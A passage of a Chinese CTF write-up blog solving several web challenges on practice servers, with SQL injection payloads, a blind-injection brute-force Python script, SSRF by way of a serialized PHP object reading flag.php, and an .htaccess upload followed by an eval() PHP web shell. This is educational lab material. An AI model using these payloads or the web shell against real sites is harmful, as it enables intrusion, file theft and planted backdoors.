<span class=\"token punctuation\">{<!-- --></span>\n                     <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'Good Job!'</span><span class=\"token punctuation\">;</span>\n                     <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                     <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'By Retr_0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                 <span class=\"token punctuation\">}</span>\n</code></pre>\n<p>其中<code>is_numeric()</code>函数用于检测变量是否为数字或数字字符串。这里要求passwd不是数字或数字字符串时，弱等于判断passwd是否等于1234567<br/> 故构造payload：<code>passwd=1234567a</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\a79cff56451f4119b14d01d371cfaa67.png\"/><br/> 拿到flag~~</p>\n<h1><a id=\"GXYCTF2019BabySQli_1335\"></a>[GXYCTF2019]BabySQli</h1>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\5a5650ed17aa4b80a2f79375c516042b.png\"/><br/> 一个输入框，随便输入<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\34ad1d0e55774e9fa2c97cc579e47707.png\"/><br/> 发现进入了search.php<br/> 查看源码<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\e059de45bf8740e1978126092c0b801f.png\"/><br/> 第一行有一串加密的字符，base32+base64解密<br/> 得到：<code>select * from user where username = '$name'</code><br/> 爆字段数：<code>name=admin' Order by 3 #&amp;pw=1</code>——注意：这里的or被过滤，使用大小写绕过</p>\n<p>经测试admin在第二字段<br/> <code>name=1' union select 1,'admin','202cb962ac59075b964b07152d234b70' #&amp;pw=123</code></p>\n<p>最后查看一下源码</p>\n<pre><code class=\"prism language-php\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token operator\">--</span><span class=\"token constant\">MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5</span><span class=\"token operator\">--</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span>meta http<span class=\"token operator\">-</span>equiv<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"Content-Type\"</span> content<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"text/html; charset=utf-8\"</span> <span class=\"token operator\">/</span><span class=\"token operator\">&gt;</span> \n<span class=\"token operator\">&lt;</span>title<span class=\"token operator\">&gt;</span><span class=\"token keyword\">Do</span> you know who am <span class=\"token constant\">I</span><span class=\"token operator\">?</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>title<span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php\n<span class=\"token keyword\">require</span> <span class=\"token string double-quoted-string\">\"config.php\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">require</span> <span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// 去除转义</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">get_magic_quotes_gpc</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n\t<span class=\"token keyword\">function</span> <span class=\"token function\">stripslashes_deep</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">{<!-- --></span>\n\t\t<span class=\"token variable\">$value</span> <span class=\"token operator\">=</span> <span class=\"token function\">is_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span>\n\t\t<span class=\"token function\">array_map</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'stripslashes_deep'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span>\n\t\t<span class=\"token class-name return-type\">stripslashes</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">return</span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n\n\t<span class=\"token variable\">$_POST</span> <span class=\"token operator\">=</span> <span class=\"token function\">array_map</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'stripslashes_deep'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$_GET</span> <span class=\"token operator\">=</span> <span class=\"token function\">array_map</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'stripslashes_deep'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$_COOKIE</span> <span class=\"token operator\">=</span> <span class=\"token function\">array_map</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'stripslashes_deep'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$_REQUEST</span> <span class=\"token operator\">=</span> <span class=\"token function\">array_map</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'stripslashes_deep'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$con</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'SET NAMES UTF8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$name</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pw'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$t_pw</span> <span class=\"token operator\">=</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"select * from user where username = '\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$name</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"'\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// echo $sql;</span>\n<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$con</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\(|\\)|\\=|or/\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n\t<span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"do not hack me!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Error: %s\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">mysqli_error</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$con</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n\t\t<span class=\"token comment\">// echo '&lt;pre&gt;';</span>\n\t\t<span class=\"token variable\">$arr</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_fetch_row</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token comment\">// print_r($arr);</span>\n\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$arr</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string double-quoted-string\">\"admin\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n\t\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token variable\">$arr</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n\t\t\t\t<span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token punctuation\">}</span>\n\t\t\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n\t\t\t\t<span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"wrong pass!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token punctuation\">}</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n\t\t\t<span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"wrong user!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>下面代码过滤了<code>/\\(|\\)|\\=|or/</code>字符</p>\n<pre><code class=\"prism language-php\"><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\(|\\)|\\=|or/\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n\t<span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"do not hack me!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre>\n<p>这里表示password进行了md5加密，且用户必须是admin</p>\n<pre><code class=\"prism language-php\"><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$arr</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string double-quoted-string\">\"admin\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n\t\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token variable\">$arr</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n\t\t\t\t<span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token punctuation\">}</span>\n</code></pre>\n<h1><a id=\"CISCN2019__Day2_Web1Hack_World_1429\"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h1>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\dea52f60945e4329b0133d7a1bef20d2.png\"/></p>\n<p>显示了一些常见的SQL字符，很多都被过滤了<br/> 但还有<code>()</code>字符没被过滤，我们使用<code>()</code>代替空格，而且题目提示flag在flag表的flag字段中<br/> 这里使用脚本爆破</p>\n<pre><code class=\"prism language-python\"><span class=\"token comment\"># -*- coding:utf-8 -*-</span>\n<span class=\"token comment\"># Author: mochu7</span>\n<span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">import</span> string\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">blind_injection</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\tflag <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n\tstrings <span class=\"token operator\">=</span> string<span class=\"token punctuation\">.</span>printable\n\t<span class=\"token keyword\">for</span> num <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">60</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\t\t<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> strings<span class=\"token punctuation\">:</span>\n\t\t\tpayload <span class=\"token operator\">=</span> <span class=\"token string\">'(select(ascii(mid(flag,{0},1))={1})from(flag))'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">,</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#format函数设置指定位置{0}{1}</span>\n\t\t\tpost_data <span class=\"token operator\">=</span> <span class=\"token punctuation\">{<!-- --></span><span class=\"token string\">\"id\"</span><span class=\"token punctuation\">:</span>payload<span class=\"token punctuation\">}</span>\n\t\t\tres <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>url<span class=\"token punctuation\">,</span>data<span class=\"token operator\">=</span>post_data<span class=\"token punctuation\">)</span>\n\t\t\t<span class=\"token keyword\">if</span> <span class=\"token string\">'Hello'</span> <span class=\"token keyword\">in</span> res<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span>\n\t\t\t\tflag <span class=\"token operator\">+=</span> i\n\t\t\t\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">':'</span><span class=\"token operator\">+</span>flag<span class=\"token punctuation\">)</span>\n\t\t\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n\t\t\t\t<span class=\"token keyword\">continue</span>\n\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span>\n\turl <span class=\"token operator\">=</span> <span class=\"token string\">'http://f22f114e-13f7-4f18-8877-3429e32adcbd.node4.buuoj.cn:81/index.php'</span>\n\tblind_injection<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span>\n\n\n</code></pre>\n<p>这里有的字符因时间过长可能会跳过，多执行几次累加起来即可</p>\n<h1><a id=\"GYCTF2020Blacklist_1465\"></a>[GYCTF2020]Blacklist</h1>\n<p><strong>题目类型：堆叠注入+HANDLER</strong><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\994fd714107a4c91a993f40f1168cd7b.png\"/><br/> <code>1';show databases;#</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\40d7f7c8db3e4276958dc1c0ca6d24e1.png\"/><br/> <code>1';show tables;#</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\a0d4860b59d847358b155ccbb765824b.png\"/><br/> <code>1'; show columns from FlagHere;#</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\b52a52330a6b499e989a215ffa160ae4.png\"/><br/> 发现这里有一些过滤<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\21b4819437214462a54cd3d5162a3dbe.png\"/><br/> 然后我就没思路了，记得跟 <strong>[强网杯 2019]随便注</strong> 差不多，但这个过滤的更严</p>\n<p>下面是学习大佬的方法：</p>\n<p><code>HANDLER OPEN</code>语句打开一个表，使其可以使用后续<code>HANDLER READ</code>语句访问，该表对象未被其他会话共享，并且在会话调用<code>HANDLER CLOSE</code>或会话终止之前不会关闭<br/> <code>1';handler FlagHere open;handler FlagHere read first;handler FlagHere close;#</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\189ecbbf62b848a28161c2b61469bb05.png\"/></p>\n<h1><a id=\"_2018Fakebook_1483\"></a>[网鼎杯 2018]Fakebook</h1>\n<p><strong>题目类型：sql+ssrf+序列化+代码审计</strong><br/> 像这种blog猜测应该是xss漏洞<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\a1c64eb77cc844d8a61c614e89e48a9d.png\"/></p>\n<p>点击join，先试了一下xss<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\dd641adc15b6493cb34d7770953b502f.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\b45d12ae54824765b86deed52b56e47e.png\"/><br/> 抓包看看<img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\be17626f00d14207adf53569ece6c581.png\"/>没什么思路</p>\n<p>查看大佬博客发现，blog是有限制的，必须http开头<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\138ffc6de33e47bc9f7ad22299315cba.png\"/>然后发现username处是个链接，点进去<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\e9fed046579b4a25b0ecfa245b55ed77.png\"/>URL里有个参数no，使<code>no=0</code>试一试<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\68b15a56311041e3a29eafb90af9d9e8.png\"/><br/> 没有什么新发现<br/> 尝试看看有没有SQL注入漏洞，使<code>no=1'</code><br/> 报错了，SQL语法错误，说明这是个数字型的sql注入</p>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\9e74bad619314a09a72071cd2f43dc34.png\"/><br/> 经过尝试，发现union被过滤，这里空格用<code>/**/</code>代替，构造<code>?no=0/**/union/**/select/**/1,2,3,4#</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\d676c49132584c56bfdad1f4ef39fbbc.png\"/><br/> 从报错信息来看，回显位置是2，而且这里的数据都被进行了序列化，爆出路径<code>/var/www/html</code></p>\n<p>使用dirsearch扫描目录，发现<code>user.php.bak</code>，访问，出现源码</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">UserInfo</span>\n<span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$name</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$age</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$blog</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$age</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$blog</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">name</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$name</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">age</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">int</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$age</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">blog</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$blog</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$url</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$ch</span> <span class=\"token operator\">=</span> <span class=\"token function\">curl_init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_URL</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$url</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_RETURNTRANSFER</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$output</span> <span class=\"token operator\">=</span> <span class=\"token function\">curl_exec</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$httpCode</span> <span class=\"token operator\">=</span> <span class=\"token function\">curl_getinfo</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLINFO_HTTP_CODE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$httpCode</span> <span class=\"token operator\">==</span> <span class=\"token number\">404</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token keyword\">return</span> <span class=\"token number\">404</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token function\">curl_close</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$output</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">getBlogContents </span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">blog</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">isValidBlog </span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$blog</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">blog</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]{2,6}(\\:[0-9]+)?(\\/\\S*)?$/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$blog</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre>\n<p>代码审计：get函数中有出现<code>curl_exec()</code>，存在ssrf，且没有过滤。curl可用file协议，blog属性调用了get函数，所以这里使用file协议读取文件。<code>file:///var/www/html/flag.php</code></p>\n<p>所以我们先编写脚本进行序列化</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">UserInfo</span><span class=\"token punctuation\">{<!-- --></span>\n\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$name</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'1'</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$age</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$blog</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"file:///var/www/html/flag.php\"</span><span class=\"token punctuation\">;</span>\t\n<span class=\"token punctuation\">}</span>\n<span class=\"token variable\">$obj</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">UserInfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$obj</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\a0ce90bb76294bc0be8ae61048f5d75e.png\"/></p>\n<p>构造payload：<code>?no=0/**/union/**/select/**/1,2,3,'O:8:\"UserInfo\":3:{s:4:\"name\";s:1:\"1\";s:3:\"age\";i:0;s:4:\"blog\";s:29:\"file:///var/www/html/flag.php\";}'</code><br/> ![在这里插入图片描述](https://img-blog.csdnimg.cn/f0c62715328b499bbb4a190660a07885.png?x-oss-process=image<img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\95fdbef06e8841778f03a1415d622cad.png\"/>flag.php文件的内容出现在iframe中，F12查看<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\38ed30bd6ba0436eaf44569cedd634cb.png\"/></p>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\94199d2a1b1d4953b296f5cd6d697034.png\"/>拿到flag~~</p>\n<h1><a id=\"GXYCTF2019BabyUpload_1576\"></a>[GXYCTF2019]BabyUpload</h1>\n<p><strong>题目类型</strong>：图片马+通过配置文件构造PHP后门</p>\n<p>随便上传图片马，都提示上传失败，猜测是过滤了一些字符，在前面的<a href=\"https://blog.csdn.net/m0_52923241/article/details/119751029?spm=1001.2014.3001.5501\">[MRCTF2020]你传你🐎呢</a>中有提到一些方法，我们先试着上传一个<code>.htaccess</code>文件</p>\n<pre><code class=\"prism language-php\"><span class=\"token operator\">&lt;</span>FilesMatch <span class=\"token string double-quoted-string\">\"a.jpeg\"</span><span class=\"token operator\">&gt;</span>\nSetHandler application<span class=\"token operator\">/</span>x<span class=\"token operator\">-</span>httpd<span class=\"token operator\">-</span>php\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>FilesMatch<span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>点击上传时用burp抓包，修改Content-Type为：<code>image/jpeg</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\c8f5c56d9eaa4b2f91fc6bfa415bf6a8.png\"/>上传成功</p>\n<p>再继续上传图片马<code>&lt;?php @eval($_POST['a']);?&gt;</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\5a121bd48ee143b094872bf98ef57bfe.png\"/>蚁剑链接,拿到flag~~</p>\n<p>查看源码</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">session_start</span><span class=\"token 